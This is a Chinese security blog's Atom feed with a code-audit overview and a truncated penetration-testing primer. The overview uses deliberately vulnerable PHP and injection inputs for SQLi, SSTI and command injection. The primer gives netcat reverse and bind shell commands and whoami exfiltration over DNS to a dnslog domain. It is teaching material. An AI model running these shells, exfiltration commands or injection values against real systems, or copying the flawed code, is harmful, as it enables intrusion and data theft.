<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://ink-scholar.github.io/atom.xml" rel="self"/>
  
  <link href="https://ink-scholar.github.io/"/>
  <updated>2023-12-18T16:55:32.866Z</updated>
  <id>https://ink-scholar.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计概述</title>
    <link href="https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
    <id>https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</id>
    <published>2023-12-17T12:43:25.221Z</published>
    <updated>2023-12-18T16:55:32.866Z</updated>
    
    <content type="html"><![CDATA[<p>先来一张图</p><img src="/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png" alt="image-20231217210117066" style="zoom:33%;"><p>术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧）</p><p>用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性）</p><p>体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础）</p><p>即 一线技巧 –》 思考者 –》 安全本质</p><p>个人觉得说的很好，深有感触 </p><h1 id="安全的本质"><a href="#安全的本质" class="headerlink" title="安全的本质"></a>安全的本质</h1><p>信任问题！</p><p>一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。</p><p>是否该信任普通用户的输入？（前台漏洞）</p><p>是否该信任管理员用户的输入？（后台漏洞）</p><p>是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击）</p><p>不信任任何输入？（信任了输入的检测逻辑）</p><h1 id="安全方案模型"><a href="#安全方案模型" class="headerlink" title="安全方案模型"></a>安全方案模型</h1><p>所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出</p><h1 id="为什么是输入？？"><a href="#为什么是输入？？" class="headerlink" title="为什么是输入？？"></a>为什么是输入？？</h1><p>所有的输入都是恶意的：入侵检测理论的名言</p><p>我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手</p><p>在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点</p><h1 id="程序希望用户输入什么"><a href="#程序希望用户输入什么" class="headerlink" title="程序希望用户输入什么"></a>程序希望用户输入什么</h1><h2 id="控制流与数据流"><a href="#控制流与数据流" class="headerlink" title="控制流与数据流"></a>控制流与数据流</h2><p>看两段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;Hello my name is :</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(Hello my name is :<span class="string">&quot; + &quot;</span>&lt;?php</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据）</p><p><strong>程序员希望用户输入的一定数据流而不是控制流</strong></p><p>一旦我们  <strong>输入的数据</strong>  能够以某种方式侵入到控制流时，漏洞就产生了</p><p>如下</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from table where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一下输入到流转：</p><p>输入 –》 php字符串变量 –》 sql语句 –》 数据库</p><p>在数据库层面，控制流是sql语句，原本这段代码的本意是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">key：username</span><br><span class="line">value：$username</span><br></pre></td></tr></table></figure><p>代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞</p><p>比如我们输入：<strong>admin’  and 1&#x3D;1#</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">expression：and</span><br><span class="line">key1：username</span><br><span class="line">value1：$username</span><br><span class="line">key2: 1</span><br><span class="line">value2: 1</span><br></pre></td></tr></table></figure><p><strong>我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流</strong></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>服务端模版注入</p><p>Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示</p><p>我们再看一下错误的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示</p><p><strong>我们在代码层（php）的输入，导致了Twig模板层的数据流入侵到了控制流</strong></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$domain</span> = <span class="variable">$_GET</span>[<span class="string">&quot;domain&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tracert &quot;&#x27;</span>.<span class="variable">$domain</span>.<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码其实就是tracert命令</p><p>程序原意是在 <strong>bash程序</strong> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute：</span><br><span class="line">process:</span><br><span class="line">exe: tracert  --&gt; /bin/tracert</span><br><span class="line">arg: $domain</span><br></pre></td></tr></table></figure><p>此时，程序必须保证用户的输入只能影响到arg位置，如果不能保障，则会产生漏洞</p><p>比如输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu.com&quot;;whoami;echo &quot;fuck qax</span><br></pre></td></tr></table></figure><p>此时代码里的拼接为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert &quot;baidu.com&quot;;whoami;echo &quot;fuck qax&#x27;</span><br></pre></td></tr></table></figure><p>此时代码执行的逻辑为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execute：</span><br><span class="line">process1:</span><br><span class="line">exe: tracert  </span><br><span class="line">arg: &quot;baidu.com&quot;</span><br><span class="line">or--&gt;</span><br><span class="line">process2:</span><br><span class="line">exe: whoami</span><br><span class="line">arg: -</span><br><span class="line">or--&gt;</span><br><span class="line">exe: echo</span><br><span class="line">arg: &quot;fuck qax&quot;</span><br></pre></td></tr></table></figure><p><strong>我们在代码层（php）的输入，导致了bash程序层的数据流入侵到了控制流</strong></p><h2 id="业务流程问题"><a href="#业务流程问题" class="headerlink" title="业务流程问题"></a>业务流程问题</h2><p>很多逻辑漏洞、越权漏洞，往往来源于此，也是现代mvc结构出现比较多的问题。（现代mvc结构一般不会出现sql注入[预编译解决]、xss[前端框架解决]、webshell上传[java，python这种网站或者oss存储]）</p><h3 id="过度信任用户输入"><a href="#过度信任用户输入" class="headerlink" title="过度信任用户输入"></a>过度信任用户输入</h3><p>业务功能：输出当前用户信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_id</span> = <span class="keyword">int</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from user where user_id = <span class="subst">$user_id</span>&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_user_profile</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个典型的越权读取模型，虽然没有sql注入问题，但是在业务逻辑上的校验有漏洞，信任了用户输入的user_id</p><h3 id="不信任用户输入–即信任检测逻辑"><a href="#不信任用户输入–即信任检测逻辑" class="headerlink" title="不信任用户输入–即信任检测逻辑"></a>不信任用户输入–即信任检测逻辑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>J = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;user_id&quot;</span>];     <span class="comment">// 假定管理员user_id=。</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location: /user.php?is_login=l&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;密码错误&quot;</span>；</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// http://192.168.215.129/login.php?password=test&amp;user_id=123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//user.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;is_login&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你登录了&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是管理员&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你不是管理员&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没登陆&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个经典的逻辑绕过漏洞，在整个流程中，开发者完全没有信任用户的输入。</p><p>对密码进行了校验，校验通过才存session，并且用户id也是存储于session中的，没法通过cookie伪造绕过鉴权。</p><p><strong>不信任任何输入–》对输入进行检测</strong>（实际上就是把信任关系绑定到了对输入检测逻辑上，那么一旦<strong>输入检测逻辑出现问题</strong>，信任关系被打破，就出现了漏洞）</p><p><strong>php是弱类型语言，在php中，NULL &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “”</strong></p><p>所以上面的代码中，我们什么都不输入，就可以绕过检测</p><h1 id="用体-用-术看待问题"><a href="#用体-用-术看待问题" class="headerlink" title="用体-用-术看待问题"></a>用体-用-术看待问题</h1><p>盗张图</p><p><img src="/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231219004846286.png" alt="image-20231219004846286"></p><p><strong>切记！！！紧紧抓入输入，即能否让数据流逃逸到控制流，你的输入能否在业务逻辑上产生问题，如何根据污点分析快速筛选出有问题的业务</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先来一张图&lt;/p&gt;
&lt;img src=&quot;/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png&quot; alt=&quot;image-2023121721</summary>
      
    
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--基础入门</title>
    <link href="https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <id>https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</id>
    <published>2023-12-14T14:33:04.392Z</published>
    <updated>2024-01-02T15:19:58.320Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一点和web相关的基础知识，随便写写，不成系统</strong></em></p><h1 id="Web环境常规知识"><a href="#Web环境常规知识" class="headerlink" title="Web环境常规知识"></a>Web环境常规知识</h1><p>web应用系统常见的三种搭建方式：子域名、端口、目录三种方式</p><p>其他方式还有类似于博客园这种分配站的形式</p><p>网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高</p><p>对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患</p><p>开源源码–源码可见&#x2F;源码不可见（加密，语言特性）</p><p>加密一般网上有对应的，比如asp、php加解密网站</p><p>语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译</p><p>路由访问：url和文件目录对应不上很正常，要根据配置路由决定</p><p>前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端</p><p>类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关</p><p>Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写</p><p>WAF:</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217111805176.png" alt="image-20231217111805176"></p><p>CDN：内容分发服务，提高访问速度，可隐藏真实源IP</p><p>反向代理：</p><p>正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130038060.png" alt="image-20231217130038060"></p><p>反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130116573.png" alt="image-20231217130116573"></p><p>因此你的访问目标只是一个代理，而非真实的应用服务器</p><p>正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系</p><p>负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况</p><p>在宝塔中可以如下进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 定义负载设置</span><br><span class="line">upstream fzjh&#123;</span><br><span class="line">server 1.1.1.1:80 weight=2;</span><br><span class="line">server 2.2.2.2:80 weight=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义访问路径和策略</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://fzjh/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>APP&#x2F;小程序应用开发架构：</p><p>1、原生开发</p><p>安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的</p><p>2、H5开发</p><p>使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题</p><p>3、使用flutter开发</p><p>谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善</p><p>4、常规web开发</p><p>就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。</p><h1 id="Web常规命令基础"><a href="#Web常规命令基础" class="headerlink" title="Web常规命令基础"></a>Web常规命令基础</h1><p>推荐个网站：<a href="https://forum.ywhack.com/bountytips.php">https://forum.ywhack.com/bountytips.php</a></p><p>在里面填一些基本信息会将命令显示出来</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217162209085.png" alt="image-20231217162209085"></p><p>文件上传下载：</p><p>Linux：wget，curl，python，ruby，perl，java等</p><p>Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等</p><p>反弹shell：</p><p>正向连接：即自己主动找别人，如Linux控制windows正向连接</p><p>在windows上绑定cmd到本地5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后Linux主动连接windows的5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat ip 5566</span><br></pre></td></tr></table></figure><p>同理，windows控制Linux的话，在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvvp 5566</span><br></pre></td></tr></table></figure><p>在windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 5566</span><br></pre></td></tr></table></figure><p>反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接</p><p>在Windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e  /bin/sh windows的ip windows本地正在监听的端口</span><br></pre></td></tr></table></figure><p>管道符：</p><p>Windows：|  &amp;  ||   &amp;&amp;</p><p>Linux：;  |   ||   &amp;   &amp;&amp;   &#96;&#96;</p><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行</p><p>管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果</p><p>&amp;放在启动参数后面表示设置此进程为后台进程</p><p>只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行</p><p>只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行</p><p>数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell $a=whoami;$a=$a.replace(&#x27;\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c</span><br></pre></td></tr></table></figure><p> 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \ ，所有加个replace去替换</p><h1 id="抓包基础"><a href="#抓包基础" class="headerlink" title="抓包基础"></a>抓包基础</h1><h2 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>charles（茶杯）、Fiddler、burp，怎么安装使用网上一大堆，这里不多赘述。</p><p>抓微信小程序：可以使用charles抓包，然后转给burp分析；还可以使用proxifier</p><p>个人推荐使用proxifier，打开后在代理服务器中选择https，地址与端口和burp的保持一致，然后在代理规则中的应用程序输入wechat*.exe即可，这是在Windows上的方法，如果用mac的话，应用程序那里可以点 <strong>+</strong> 号</p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231221150617389.png" alt="image-20231221150617389" style="zoom: 50%;"><p>然后在Applications那里，搜索应用，如微信小程序</p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231225102759395.png" alt="image-20231225102759395" style="zoom:50%;"><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231225102852754.png" alt="image-20231225102852754" style="zoom:50%;"><p> 这个Mini Program 就是小程序的执行程序</p><p>PC应用：和抓微信小程序一样，也是用 proxifier➕burp 即可</p><h2 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h2><p>推荐工具：科来（没有mac版本，适合新手）、Wireshark </p><p> 模拟器的一些游戏抓取可以用一个封包监听工具，下载地址和使用说明可以去b站看看</p><p><a href="https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&vd_source=f0e85cdc73190cf042eeba2be6dba3cb">https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&amp;vd_source=f0e85cdc73190cf042eeba2be6dba3cb</a></p><h1 id="编码算法加密基础"><a href="#编码算法加密基础" class="headerlink" title="编码算法加密基础"></a>编码算法加密基础</h1><h2 id="加密-编码"><a href="#加密-编码" class="headerlink" title="加密&amp;编码"></a>加密&amp;编码</h2><h3 id="单向散列加密"><a href="#单向散列加密" class="headerlink" title="单向散列加密"></a>单向散列加密</h3><p>代表有 <strong>MD5</strong> ，常见的还有 <strong>SHA</strong> ， <strong>MAC</strong> ， 